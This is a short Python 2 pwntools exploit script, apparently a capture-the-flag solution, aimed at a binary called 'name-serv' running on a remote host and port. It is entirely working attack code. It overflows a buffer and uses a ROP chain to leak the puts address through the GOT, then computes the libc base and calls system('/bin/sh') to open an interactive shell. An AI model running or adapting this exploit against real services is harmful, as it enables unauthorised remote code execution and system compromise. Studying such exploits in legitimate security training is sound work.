```python
#!/usr/bin/python2
from pwn import *
from sys import *

context.arch = "amd64"
# context.arch = "i386"

e = ELF('name-serv')
if(len(argv) == 2):
    p = connect("3.97.113.25", 9001)
else:
    p = process('name-serv')


cmd = """
"""
if(len(argv) == 3):
    gdb.attach(p, cmd)

#libc = ELF('libc.so.6', checksec=False)
#libc = ELF('/usr/lib32/libc.so.6')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)        



poprdi = next(e.search(asm('pop rdi; ret')))
ret = next(e.search(asm('ret')))

pload = ""
pload += "A" * 0x20 
pload += "B" * 8
pload += p64(poprdi) 
pload += p64(e.got.puts) 
pload += p64(e.symbols.puts)
pload += p64(e.symbols.main)


p.sendline(pload)
p.recvuntil(': ')
leak  = p.recv(6) + '\x00\x00'
leak = u64(leak)

print 'leak', hex(leak)

libc.address = leak - libc.symbols.puts


pload = ""
pload += "A" * 0x20 
pload += "B" * 8

binsh = next(libc.search('/bin/sh'))

pload += p64(ret)
pload += p64(poprdi)
pload += p64(binsh)
pload += p64(libc.symbols.system)
p.sendline(pload)
p.interactive()
```